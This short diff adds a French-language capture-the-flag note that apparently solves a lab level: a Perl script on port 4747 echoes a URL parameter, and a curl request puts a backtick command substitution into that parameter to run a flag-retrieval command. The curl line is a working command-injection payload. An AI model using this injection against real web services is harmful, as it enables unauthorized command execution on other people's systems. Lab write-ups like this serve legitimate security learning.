@@ -1,0 +1,2 @@
+Regarder le fichier perl sur la home. Il run en background sur le port 4747. Il fait un echo du paramètre x dans l'url.
+Effectuer curl 'localhost:4747/level04.pl?x=`getflag`' pour print le fichier getflag et obtenir le flag.
